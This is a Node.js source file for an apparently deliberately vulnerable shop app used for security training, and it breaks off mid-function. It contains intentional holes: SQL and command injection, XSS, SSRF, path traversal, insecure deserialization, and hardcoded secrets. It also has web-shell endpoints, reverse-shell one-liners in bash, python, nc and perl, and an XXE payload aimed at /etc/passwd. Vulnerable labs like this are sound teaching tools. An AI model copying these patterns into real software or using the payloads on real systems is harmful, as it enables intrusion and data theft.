/**
 * ⚠️ VULNERABLE APPLICATION - FOR SECURITY TESTING ONLY ⚠️
 * This app contains INTENTIONAL vulnerabilities for educational purposes.
 * NEVER deploy this in production or expose to the internet!
 */

const express = require('express');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const multer = require('multer');
const { Pool } = require('pg');
const path = require('path');
const fs = require('fs');
const child_process = require('child_process');
const serialize = require('node-serialize');
const _ = require('lodash');
const axios = require('axios');

const exec = child_process.exec;
const execSync = child_process.execSync;

const app = express();
const upload = multer({ dest: 'uploads/' });

app.set('view engine', 'ejs');
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// Database connection
const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 'postgresql://vulnuser:vulnpass@localhost:5432/vulndb'
});

// ==========================================
// HOME PAGE - Shopping Mall
// ==========================================
app.get('/', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, name, price, image_url, data FROM products LIMIT 6');
    const products = result.rows.map(p => ({
      id: p.id,
      name: p.name,
      price: parseFloat(p.price),
      image_url: p.image_url,
      category: p.data?.category || 'General',
      badge: p.data?.badge,
      originalPrice: p.data?.original_price
    }));
    res.render('shop', { products, title: 'LUXORA - Premium Lifestyle Store' });
  } catch (err) {
    // Fallback to static products if DB fails
    const products = [
      { id: 1, name: 'Classic Leather Tote', category: 'Bags', price: 299.00, originalPrice: 399.00, badge: 'Sale', image_url: 'https://images.unsplash.com/photo-1584917865442-de89df76afd3?w=800' },
      { id: 2, name: 'Minimalist Watch', category: 'Accessories', price: 189.00, badge: 'New', image_url: 'https://images.unsplash.com/photo-1523275335684-37898b6baf30?w=800' },
      { id: 3, name: 'Cashmere Sweater', category: 'Clothing', price: 249.00, image_url: 'https://images.unsplash.com/photo-1434389677669-e08b4cac3105?w=800' },
      { id: 4, name: 'Silk Scarf Collection', category: 'Accessories', price: 89.00, originalPrice: 129.00, image_url: 'https://images.unsplash.com/photo-1601924994987-69e26d50dc26?w=800' },
      { id: 5, name: 'Premium Sunglasses', category: 'Accessories', price: 159.00, badge: 'Best Seller', image_url: 'https://images.unsplash.com/photo-1572635196237-14b3f281503f?w=800' },
      { id: 6, name: 'Leather Belt', category: 'Accessories', price: 79.00, image_url: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=800' }
    ];
    res.render('shop', { products, title: 'LUXORA - Premium Lifestyle Store' });
  }
});

// ==========================================
// PRODUCTS & CATEGORIES
// ==========================================

// All Products Page
app.get('/products', async (req, res) => {
  try {
    const result = await pool.query('SELECT id, name, price, image_url, data FROM products ORDER BY id');
    const products = result.rows.map(p => ({
      id: p.id,
      name: p.name,
      price: parseFloat(p.price),
      image_url: p.image_url,
      category: p.data?.category || 'General',
      badge: p.data?.badge,
      originalPrice: p.data?.original_price
    }));
    res.render('products', { products, title: 'All Products - LUXORA', category: 'All' });
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Category Page
app.get('/category/:name', async (req, res) => {
  const { name } = req.params;
  try {
    const result = await pool.query(
      `SELECT id, name, price, image_url, data FROM products WHERE data->>'category' ILIKE $1`,
      [`%${name}%`]
    );
    const products = result.rows.map(p => ({
      id: p.id,
      name: p.name,
      price: parseFloat(p.price),
      image_url: p.image_url,
      category: p.data?.category || 'General',
      badge: p.data?.badge,
      originalPrice: p.data?.original_price
    }));
    res.render('products', { products, title: `${name} - LUXORA`, category: name });
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// New Arrivals
app.get('/new-arrivals', async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT id, name, price, image_url, data FROM products WHERE data->>'badge' = 'New' OR data->>'badge' IS NOT NULL ORDER BY id DESC LIMIT 12`
    );
    const products = result.rows.map(p => ({
      id: p.id,
      name: p.name,
      price: parseFloat(p.price),
      image_url: p.image_url,
      category: p.data?.category || 'General',
      badge: p.data?.badge,
      originalPrice: p.data?.original_price
    }));
    res.render('products', { products, title: 'New Arrivals - LUXORA', category: 'New Arrivals' });
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Sale Items
app.get('/sale', async (req, res) => {
  try {
    const result = await pool.query(
      `SELECT id, name, price, image_url, data FROM products WHERE data->>'badge' = 'Sale' OR data->>'original_price' IS NOT NULL`
    );
    const products = result.rows.map(p => ({
      id: p.id,
      name: p.name,
      price: parseFloat(p.price),
      image_url: p.image_url,
      category: p.data?.category || 'General',
      badge: p.data?.badge,
      originalPrice: p.data?.original_price
    }));
    res.render('products', { products, title: 'Sale - LUXORA', category: 'Sale' });
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Newsletter subscription - VULN: No validation, stores emails
app.post('/newsletter', async (req, res) => {
  const { email } = req.body;

  try {
    // VULN: Email stored without validation
    await pool.query('INSERT INTO comments (author, content) VALUES ($1, $2)', ['Newsletter', email]);
    res.redirect('/?subscribed=true');
  } catch (err) {
    res.redirect('/?subscribed=false');
  }
});

// Checkout page
app.get('/checkout', (req, res) => {
  res.render('checkout', { title: 'Checkout - LUXORA' });
});

app.post('/checkout', (req, res) => {
  // VULN: Credit card data logged
  const { cardNumber, expiry, cvv, name } = req.body;
  console.log('Payment received:', { cardNumber, expiry, cvv, name });

  res.redirect('/checkout/success');
});

app.get('/checkout/success', (req, res) => {
  res.render('checkout-success', { title: 'Order Confirmed - LUXORA' });
});

// About Page
app.get('/about', (req, res) => {
  res.render('about', { title: 'About Us - LUXORA' });
});

// Contact Page
app.get('/contact', (req, res) => {
  const sent = req.query.sent || null;
  res.render('contact', { title: 'Contact Us - LUXORA', sent });
});

app.post('/contact', async (req, res) => {
  const { name, email, message } = req.body;

  // VULN: User input logged without sanitization
  console.log('Contact form:', { name, email, message });

  try {
    await pool.query(
      'INSERT INTO comments (author, content) VALUES ($1, $2)',
      [name, `Contact from ${email}: ${message}`]
    );
    res.redirect('/contact?sent=true');
  } catch (err) {
    res.redirect('/contact?sent=false');
  }
});

// ==========================================
// A01:2021 - BROKEN ACCESS CONTROL
// ==========================================
const users = {
  admin: { password: 'admin123', role: 'admin', apiKey: 'sk-admin-secret-key-12345' },
  user: { password: 'user123', role: 'user', apiKey: 'sk-user-key-67890' },
  guest: { password: 'guest123', role: 'guest', apiKey: 'sk-guest-key-11111' }
};

// Insecure login - no rate limiting, weak credentials
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users[username];

  // VULN: Timing attack possible
  if (user && user.password === password) {
    res.cookie('auth', JSON.stringify({ username, role: user.role }), { httpOnly: false });
    res.cookie('apiKey', user.apiKey);
    res.json({ success: true, message: 'Login successful', apiKey: user.apiKey });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

// IDOR - Insecure Direct Object Reference
app.get('/profile/:id', async (req, res) => {
  const { id } = req.params;

  // VULN: No authorization check, can access any user's data
  try {
    const result = await pool.query('SELECT * FROM users WHERE id = $1', [id]);
    if (result.rows.length > 0) {
      res.render('profile', { user: result.rows[0] });
    } else {
      res.status(404).send('User not found');
    }
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Admin Login Page
app.get('/admin/login', (req, res) => {
  res.render('admin-login', { error: false });
});

// Admin Login Handler - VULN: Weak credentials (admin:admin123, root:toor)
app.post('/admin/login', (req, res) => {
  const { username, password } = req.body;

  // VULN: Hardcoded weak admin credentials
  const adminUsers = {
    'admin': 'admin123',
    'root': 'toor',
    'administrator': 'administrator'
  };

  // VULN: Timing attack possible, no rate limiting
  if (adminUsers[username] && adminUsers[username] === password) {
    // VULN: Cookie-based auth, client-controlled
    res.cookie('auth', JSON.stringify({ username, role: 'admin' }), { httpOnly: false });
    res.cookie('isAdmin', 'true');
    return res.redirect('/admin');
  }

  // VULN: Different error for user exists vs wrong password (enumeration)
  res.render('admin-login', { error: true });
});

// Admin Dashboard - VULN: Only checks cookie, easily bypassed
app.get('/admin', (req, res) => {
  // VULN: Client-side cookie can be manipulated
  const auth = req.cookies.auth;
  if (auth) {
    try {
      const user = JSON.parse(auth);
      // VULN: Trusts client-side cookie data for role
      if (user.role === 'admin' || req.cookies.isAdmin === 'true') {
        const recentOrders = [
          { id: 'ORD-001', customer: 'John Smith', product: 'Leather Tote', amount: 299.00, status: 'completed' },
          { id: 'ORD-002', customer: 'Sarah Johnson', product: 'Cashmere Sweater', amount: 249.00, status: 'processing' },
          { id: 'ORD-003', customer: 'Mike Wilson', product: 'Minimalist Watch', amount: 189.00, status: 'pending' },
          { id: 'ORD-004', customer: 'Emily Davis', product: 'Silk Scarf', amount: 89.00, status: 'completed' },
          { id: 'ORD-005', customer: 'David Brown', product: 'Premium Sunglasses', amount: 159.00, status: 'processing' }
        ];

        const activities = [
          { type: 'order', icon: '📦', title: 'New order #ORD-005 received', time: '5 min ago' },
          { type: 'user', icon: '👤', title: 'New customer registered', time: '12 min ago' },
          { type: 'payment', icon: '💳', title: 'Payment confirmed for #ORD-003', time: '28 min ago' },
          { type: 'alert', icon: '⚠️', title: 'Low stock alert: Leather Belt', time: '1 hour ago' }
        ];

        return res.render('admin-panel', { user, recentOrders, activities });
      }
    } catch (e) {
      // VULN: Returns detailed error
    }
  }
  res.redirect('/admin/login');
});

// ==========================================
// A02:2021 - CRYPTOGRAPHIC FAILURES
// ==========================================
app.get('/encrypt', (req, res) => {
  const { data } = req.query;

  // VULN: Using weak base64 "encryption"
  const encrypted = Buffer.from(data || '').toString('base64');

  // VULN: Hardcoded encryption key exposed
  const secretKey = 'my_super_secret_key_12345';

  res.json({
    encrypted,
    secretKey, // VULN: Exposing secret
    algorithm: 'base64' // VULN: Not real encryption
  });
});

// Password stored in plaintext
app.post('/register', async (req, res) => {
  const { username, password, email, ssn, creditCard } = req.body;

  try {
    // VULN: Storing password in plaintext
    await pool.query(
      'INSERT INTO users (username, password, email, ssn, credit_card) VALUES ($1, $2, $3, $4, $5)',
      [username, password, email, ssn, creditCard]
    );

    // VULN: Returning sensitive data in response
    res.json({
      success: true,
      user: { username, password, email, ssn, creditCard }
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// CART
// ==========================================
app.get('/cart', (req, res) => {
  // Demo cart items
  const cartItems = [
    { id: 1, name: 'Classic Leather Tote', category: 'Bags', price: 299.00, quantity: 1, size: 'M' },
    { id: 3, name: 'Cashmere Sweater', category: 'Clothing', price: 249.00, quantity: 2, size: 'L' }
  ];

  const subtotal = cartItems.reduce((sum, item) => sum + (item.price * item.quantity), 0);
  const shipping = subtotal > 100 ? 0 : 9.99;
  const tax = subtotal * 0.08;
  const total = subtotal + shipping + tax;

  res.render('cart', { cartItems, subtotal, shipping, tax, total });
});

// Promo code - VULN: Logic bypass possible
app.post('/cart/promo', (req, res) => {
  const { code } = req.body;

  // VULN: Promo codes are predictable and can be brute-forced
  const validCodes = ['SAVE10', 'WELCOME20', 'VIP30', 'BLACKFRIDAY50', 'admin'];

  if (validCodes.includes(code)) {
    res.cookie('promoApplied', code);
    res.redirect('/cart');
  } else {
    res.redirect('/cart?error=invalid');
  }
});

// ==========================================
// A03:2021 - INJECTION
// ==========================================

// Search Page - VULN: SQL Injection via search query
app.get('/search', async (req, res) => {
  const { q } = req.query;

  if (!q) {
    return res.render('search', { query: '', results: [], error: null, query_shown: null });
  }

  try {
    // VULN: Direct string concatenation - SQL Injection
    const query = `SELECT id, name, price, image_url, data->>'badge' as badge, data->>'category' as category FROM products WHERE name LIKE '%${q}%' OR data->>'category' LIKE '%${q}%'`;
    const result = await pool.query(query);
    res.render('search', { query: q, results: result.rows, error: null, query_shown: query });
  } catch (err) {
    // VULN: Detailed error exposure showing the query
    res.render('search', { query: q, results: [], error: err.message, query_shown: `SELECT ... WHERE name LIKE '%${q}%'...` });
  }
});

// Product Detail Page - VULN: IDOR via product ID
app.get('/products/:id', async (req, res) => {
  const { id } = req.params;

  try {
    // VULN: No parameterized query (SQL Injection possible via ID)
    const query = `SELECT * FROM products WHERE id = ${id}`;
    const result = await pool.query(query);

    if (result.rows.length > 0) {
      // Get reviews - VULN: Stored XSS will be rendered
      const reviewsResult = await pool.query('SELECT * FROM comments ORDER BY created_at DESC LIMIT 10');
      res.render('product', { product: result.rows[0], reviews: reviewsResult.rows });
    } else {
      res.status(404).send('Product not found');
    }
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// Product Reviews - VULN: Stored XSS
app.post('/products/:id/reviews', async (req, res) => {
  const { id } = req.params;
  const { author, content } = req.body;

  try {
    // VULN: No input sanitization - Stored XSS
    await pool.query(
      'INSERT INTO comments (author, content) VALUES ($1, $2)',
      [author, content]
    );
    res.redirect(`/products/${id}`);
  } catch (err) {
    res.status(500).send(err.message);
  }
});

// SQL Injection - Classic (hidden API endpoint)
app.get('/users', async (req, res) => {
  const { name } = req.query;

  try {
    // VULN: Direct string concatenation - SQL Injection
    const query = `SELECT * FROM users WHERE username LIKE '%${name}%'`;
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    // VULN: Detailed error exposure
    res.status(500).json({ error: err.message, query: err.query });
  }
});

// SQL Injection - Login bypass
app.post('/auth', async (req, res) => {
  const { username, password } = req.body;

  try {
    // VULN: SQL Injection in authentication
    const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
    const result = await pool.query(query);

    if (result.rows.length > 0) {
      res.json({ success: true, user: result.rows[0] });
    } else {
      res.status(401).json({ success: false });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Command Injection - Ping
app.get('/ping', (req, res) => {
  const { host } = req.query;

  if (!host) {
    return res.status(400).json({ error: 'Host parameter required' });
  }

  // VULN: Command Injection
  exec(`ping -c 1 ${host}`, (error, stdout, stderr) => {
    res.json({
      host,
      output: stdout,
      error: stderr,
      command: `ping -c 1 ${host}` // VULN: Exposing command
    });
  });
});

// Command Injection - DNS Lookup
app.get('/dns', (req, res) => {
  const { domain } = req.query;

  // VULN: Command Injection with multiple vectors
  const command = `nslookup ${domain}`;
  try {
    const output = execSync(command).toString();
    res.render('dns', { domain, output, command });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Command Injection - File operations
app.get('/file', (req, res) => {
  const { filename } = req.query;

  // VULN: Command Injection via filename
  exec(`cat ${filename}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).json({ error: stderr });
    }
    res.send(`<pre>${stdout}</pre>`);
  });
});

// NoSQL Injection (simulated with PostgreSQL JSON)
app.post('/search', async (req, res) => {
  const { criteria } = req.body;

  try {
    // VULN: Injection via JSON criteria
    const query = `SELECT * FROM products WHERE data @> '${JSON.stringify(criteria)}'`;
    const result = await pool.query(query);
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// LDAP Injection (simulated)
app.get('/ldap', (req, res) => {
  const { username } = req.query;

  // VULN: LDAP Injection pattern (simulated)
  const filter = `(uid=${username})`;

  res.json({
    message: 'LDAP query constructed',
    filter,
    vulnerable: true,
    example: 'Try: *)(uid=*))(|(uid=*'
  });
});

// XPath Injection (simulated)
app.get('/xpath', (req, res) => {
  const { name } = req.query;

  // VULN: XPath Injection
  const xpath = `//user[name='${name}']`;

  res.json({
    xpath,
    message: 'XPath query constructed',
    bypass: "Try: ' or '1'='1"
  });
});

// ==========================================
// A04:2021 - INSECURE DESIGN
// ==========================================

// Password reset with predictable tokens
app.post('/reset-password', async (req, res) => {
  const { email } = req.body;

  // VULN: Predictable reset token
  const token = Date.now().toString(36); // Very predictable

  try {
    await pool.query('UPDATE users SET reset_token = $1 WHERE email = $2', [token, email]);
    res.json({
      message: 'Reset email sent',
      token, // VULN: Exposing token
      expiresIn: '24 hours'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Weak security questions
app.get('/security-questions', async (req, res) => {
  const { email } = req.query;

  try {
    const result = await pool.query('SELECT security_question FROM users WHERE email = $1', [email]);
    res.json({
      email,
      question: result.rows[0]?.security_question || 'No question found'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Rate limiting bypass
app.post('/verify-code', (req, res) => {
  const { code } = req.body;

  // VULN: No rate limiting on verification
  const correctCode = '123456';

  if (code === correctCode) {
    res.json({ success: true, message: 'Code verified!' });
  } else {
    res.json({ success: false, message: 'Invalid code' });
  }
});

// ==========================================
// A05:2021 - SECURITY MISCONFIGURATION
// ==========================================

// Exposed configuration
app.get('/config', (req, res) => {
  // VULN: Exposing full configuration
  res.json({
    env: process.env,
    database: {
      url: process.env.DATABASE_URL,
      host: 'postgres',
      port: 5432,
      user: 'vulnuser',
      password: 'vulnpass'
    },
    secrets: {
      apiKey: 'sk-live-1234567890abcdef',
      jwtSecret: 'super-secret-jwt-key',
      encryptionKey: 'aes-256-key-1234567890123456'
    },
    debug: true,
    version: '1.0.0'
  });
});

// Stack traces enabled
app.get('/error', (req, res) => {
  // VULN: Detailed error messages
  throw new Error('This is a test error with full stack trace');
});

// Directory listing
app.get('/files', (req, res) => {
  const dir = req.query.dir || './';

  try {
    // VULN: Path traversal possible
    const files = fs.readdirSync(dir);
    res.json({
      directory: dir,
      files: files.map(f => ({
        name: f,
        path: path.join(dir, f)
      }))
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Default credentials check
app.get('/defaults', (req, res) => {
  res.json({
    message: 'Default credentials',
    credentials: [
      { service: 'admin', username: 'admin', password: 'admin' },
      { service: 'database', username: 'root', password: 'root' },
      { service: 'ftp', username: 'anonymous', password: 'anonymous' }
    ]
  });
});

// ==========================================
// A06:2021 - VULNERABLE COMPONENTS
// ==========================================

// Using vulnerable lodash prototype pollution
app.post('/merge', (req, res) => {
  const { target, source } = req.body;

  // VULN: Prototype pollution via lodash merge
  const result = _.merge({}, target, source);

  res.json({ merged: result });
});

// Insecure deserialization
app.post('/deserialize', (req, res) => {
  const { data } = req.body;

  try {
    // VULN: Insecure deserialization
    const obj = serialize.unserialize(data);
    res.json({ result: obj });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// SSRF - Server Side Request Forgery
app.get('/fetch', async (req, res) => {
  const { url } = req.query;

  if (!url) {
    return res.status(400).json({ error: 'URL required' });
  }

  try {
    // VULN: SSRF - No URL validation
    const response = await axios.get(url, { timeout: 5000 });
    res.json({
      url,
      status: response.status,
      data: response.data
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// SSRF - Internal network access
app.get('/proxy', async (req, res) => {
  const { target } = req.query;

  // VULN: Can access internal services
  const internalUrls = [
    'http://localhost:5432',
    'http://postgres:5432',
    'http://127.0.0.1:3000',
    'http://169.254.169.254' // AWS metadata
  ];

  try {
    const response = await axios.get(target);
    res.send(response.data);
  } catch (err) {
    res.status(500).json({
      error: err.message,
      hint: 'Try accessing internal services',
      examples: internalUrls
    });
  }
});

// ==========================================
// A07:2021 - AUTH FAILURES
// ==========================================

// Session fixation
app.get('/session', (req, res) => {
  // VULN: Accepting session ID from query
  const sessionId = req.query.sessionId || Math.random().toString(36);

  res.cookie('sessionId', sessionId);
  res.json({ sessionId, message: 'Session set' });
});

// Brute force vulnerable
app.post('/brute', (req, res) => {
  const { code } = req.body;
  const correctCode = '1234';

  // VULN: No rate limiting
  if (code === correctCode) {
    res.json({ success: true, flag: 'FLAG{brute_force_success}' });
  } else {
    res.status(401).json({ success: false });
  }
});

// Weak password policy
app.post('/change-password', async (req, res) => {
  const { username, newPassword } = req.body;

  // VULN: No password complexity requirements
  if (newPassword.length < 1) {
    return res.status(400).json({ error: 'Password too short' });
  }

  try {
    await pool.query('UPDATE users SET password = $1 WHERE username = $2', [newPassword, username]);
    res.json({ success: true, message: 'Password changed' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// A08:2021 - SOFTWARE INTEGRITY FAILURES
// ==========================================

// Insecure download
app.get('/download', (req, res) => {
  const { file } = req.query;

  // VULN: No integrity check, path traversal
  const filePath = path.join(__dirname, 'downloads', file);

  res.download(filePath, (err) => {
    if (err) {
      res.status(500).json({ error: 'Download failed', path: filePath });
    }
  });
});

// CI/CD simulation - insecure pipeline
app.get('/deploy', (req, res) => {
  // VULN: Simulated insecure deployment
  res.json({
    message: 'Deployment triggered',
    vulnerabilities: [
      'No code signing verification',
      'Dependencies from untrusted sources',
      'No integrity checks',
      'Auto-deploy on any commit'
    ],
    config: {
      branch: 'main',
      autoDeploy: true,
      verifySignatures: false
    }
  });
});

// ==========================================
// A09:2021 - LOGGING FAILURES
// ==========================================

// Log injection
app.post('/log', (req, res) => {
  const { message } = req.body;

  // VULN: Log injection
  const logEntry = `[${new Date().toISOString()}] User action: ${message}`;
  fs.appendFileSync('app.log', logEntry + '\n');

  res.json({ logged: true, entry: logEntry });
});

// Sensitive data in logs
app.get('/debug-logs', (req, res) => {
  // VULN: Exposing sensitive logs
  const logs = [
    { timestamp: '2024-01-01', level: 'INFO', message: 'User login: admin' },
    { timestamp: '2024-01-01', level: 'DEBUG', message: 'Password attempt: admin123' },
    { timestamp: '2024-01-01', level: 'INFO', message: 'API Key used: sk-live-12345' },
    { timestamp: '2024-01-01', level: 'ERROR', message: 'Credit card: 4111-1111-1111-1111' }
  ];

  res.json({ logs });
});

// No monitoring
app.get('/audit', (req, res) => {
  res.json({
    monitoring: false,
    alerting: false,
    logging: 'local-only',
    retention: '1 day',
    vulnerabilities: [
      'No failed login monitoring',
      'No anomaly detection',
      'No real-time alerts',
      'Logs can be deleted'
    ]
  });
});

// ==========================================
// A10:2021 - SSRF
// ==========================================

// Webhook SSRF
app.post('/webhook', async (req, res) => {
  const { callbackUrl } = req.body;

  try {
    // VULN: SSRF via webhook
    await axios.post(callbackUrl, {
      event: 'test',
      timestamp: Date.now()
    });
    res.json({ success: true, message: 'Webhook sent' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// PDF generator SSRF
app.get('/pdf', async (req, res) => {
  const { url } = req.query;

  // VULN: SSRF via PDF generation
  res.json({
    message: 'PDF generation would fetch:',
    url,
    vulnerable: true,
    internalAccess: ['http://localhost:*', 'http://127.0.0.1:*', 'http://169.254.169.254']
  });
});

// ==========================================
// XSS - CROSS-SITE SCRIPTING
// ==========================================

// Reflected XSS
app.get('/search-xss', (req, res) => {
  const { q } = req.query;

  // VULN: Direct reflection without encoding
  res.send(`
    <h1>Search Results</h1>
    <p>You searched for: ${q}</p>
    <p>Try: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
  `);
});

// Stored XSS
app.post('/comments', async (req, res) => {
  const { author, content } = req.body;

  try {
    // VULN: Storing XSS payloads
    await pool.query(
      'INSERT INTO comments (author, content) VALUES ($1, $2) RETURNING *',
      [author, content]
    );
    res.json({ success: true, author, content });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/comments', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM comments ORDER BY id DESC');
    // VULN: Rendering without sanitization
    res.render('comments', { comments: result.rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// DOM XSS
app.get('/dom-xss', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>DOM XSS Demo</title></head>
    <body>
      <h1>DOM XSS Vulnerability</h1>
      <div id="output"></div>
      <script>
        // VULN: Direct use of location.hash
        document.getElementById('output').innerHTML = decodeURIComponent(location.hash.slice(1));
      </script>
      <p>Try: #<img src=x onerror=alert('XSS')></p>
    </body>
    </html>
  `);
});

// ==========================================
// FILE UPLOAD VULNERABILITIES
// ==========================================

app.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  // VULN: No file type validation
  // VULN: Predictable filename
  // VULN: Files accessible via web
  res.json({
    message: 'File uploaded',
    filename: req.file.filename,
    originalName: req.file.originalname,
    path: `/uploads/${req.file.filename}`,
    size: req.file.size,
    mimetype: req.file.mimetype
  });
});

app.get('/uploads/:filename', (req, res) => {
  const { filename } = req.params;

  // VULN: Path traversal in file access
  const filepath = path.join(__dirname, 'uploads', filename);

  res.sendFile(filepath, (err) => {
    if (err) {
      res.status(404).json({ error: 'File not found' });
    }
  });
});

// ==========================================
// XXE - XML EXTERNAL ENTITY
// ==========================================

app.post('/xml', (req, res) => {
  const xml = req.body;

  // VULN: XXE simulation
  res.json({
    message: 'XML would be parsed with external entities enabled',
    vulnerable: true,
    payload: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>`
  });
});

// ==========================================
// PATH TRAVERSAL
// ==========================================

app.get('/read-file', (req, res) => {
  const { file } = req.query;

  // VULN: Path traversal - no sanitization
  const filepath = path.join(__dirname, 'public', file);

  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).json({
        error: err.message,
        hint: 'Try: ../../../../etc/passwd or ../../../app/server.js'
      });
    }
    res.send(data);
  });
});

// File download endpoint - VULN: Path traversal to read flags
app.get('/download', (req, res) => {
  const { file } = req.query;

  if (!file) {
    return res.status(400).json({ error: 'File parameter required' });
  }

  // VULN: No path validation - can access any file on the system
  const filepath = path.join(__dirname, 'downloads', file);

  // VULN: Even if file doesn't exist in downloads, we try the raw path
  fs.readFile(filepath, 'utf8', (err, data) => {
    if (err) {
      // VULN: Also try reading the file directly (double vulnerability)
      fs.readFile(file, 'utf8', (err2, data2) => {
        if (err2) {
          return res.status(404).json({
            error: 'File not found',
            hint: 'Try: ../flags/flag.txt or ../secrets/api_keys.txt',
            attempted_paths: [filepath, file]
          });
        }
        res.send(data2);
      });
      return;
    }
    res.send(data);
  });
});

// Static files endpoint - VULN: Directory listing + path traversal
app.get('/files', (req, res) => {
  const dir = req.query.dir || path.join(__dirname, 'public');

  try {
    // VULN: No directory restriction
    const files = fs.readdirSync(dir);
    const fileList = files.map(f => {
      const fullPath = path.join(dir, f);
      try {
        const stats = fs.statSync(fullPath);
        return {
          name: f,
          path: fullPath,
          isDirectory: stats.isDirectory(),
          size: stats.size
        };
      } catch {
        return { name: f, path: fullPath, error: 'Cannot read' };
      }
    });

    res.json({
      directory: dir,
      files: fileList,
      hint: 'Try: ?dir=../flags or ?dir=../secrets or ?dir=/etc'
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// OPEN REDIRECT
// ==========================================

app.get('/redirect', (req, res) => {
  const { url } = req.query;

  // VULN: Open redirect
  res.redirect(url);
});

app.get('/login-redirect', (req, res) => {
  const { next } = req.query;

  // VULN: Open redirect via 'next' parameter
  res.render('login-redirect', { next: next || '/home' });
});

// ==========================================
// REVERSE SHELL ENDPOINTS
// ==========================================

app.get('/shell', (req, res) => {
  const { ip, port } = req.query;

  // VULN: Reverse shell via command injection
  const payload = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;

  res.json({
    message: 'Reverse shell command',
    payload,
    command: `eval "${payload}"`,
    warning: 'EXTREMELY DANGEROUS - For authorized testing only'
  });
});

app.get('/reverse-shell', (req, res) => {
  const { listener } = req.query;

  // VULN: Another reverse shell vector
  res.json({
    payloads: [
      { type: 'bash', cmd: `bash -c 'bash -i >& /dev/tcp/${listener} 0>&1'` },
      { type: 'python', cmd: `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${listener}".split(":")[0],int("${listener}".split(":")[1])));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
      { type: 'nc', cmd: `nc -e /bin/sh ${listener}` },
      { type: 'perl', cmd: `perl -e 'use Socket;$i="${listener}";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(${listener}.split(":")[1],inet_aton(${listener}.split(":")[0])))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` }
    ],
    vulnerable: true
  });
});

// ==========================================
// API VULNERABILITIES
// ==========================================

// Mass assignment
app.put('/users/:id', async (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  // VULN: Mass assignment - allows updating any field
  const setClause = Object.keys(updates)
    .map((key, i) => `${key} = $${i + 2}`)
    .join(', ');

  try {
    const query = `UPDATE users SET ${setClause} WHERE id = $1`;
    await pool.query(query, [id, ...Object.values(updates)]);
    res.json({ success: true, updated: updates });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// No rate limiting on API
app.get('/api/v1/users', async (req, res) => {
  try {
    const result = await pool.query('SELECT * FROM users');
    // VULN: Returning all user data including passwords
    res.json(result.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GraphQL-like injection simulation
app.post('/graphql', async (req, res) => {
  const { query } = req.body;

  // VULN: Query injection simulation
  res.json({
    message: 'GraphQL query would execute',
    query,
    vulnerabilities: ['Introspection enabled', 'No query depth limit', 'No rate limiting']
  });
});

// ==========================================
// WEB SHELL
// ==========================================

app.post('/webshell', (req, res) => {
  const { cmd } = req.body;

  // VULN: Web shell functionality
  exec(cmd, (error, stdout, stderr) => {
    res.json({
      command: cmd,
      stdout: stdout || null,
      stderr: stderr || null,
      error: error ? error.message : null
    });
  });
});

app.get('/cmd', (req, res) => {
  const { exec: cmd } = req.query;

  // VULN: GET-based command execution
  try {
    const output = execSync(cmd).toString();
    res.send(`<pre>${output}</pre>`);
  } catch (err) {
    res.status(500).send(`<pre>Error: ${err.message}</pre>`);
  }
});

// ==========================================
// CORS MISCONFIGURATION
// ==========================================

app.get('/api/data', (req, res) => {
  // VULN: Reflecting Origin header
  const origin = req.headers.origin;
  res.header('Access-Control-Allow-Origin', origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', '*');

  res.json({
    sensitive: 'This data should be protected',
    user: 'admin',
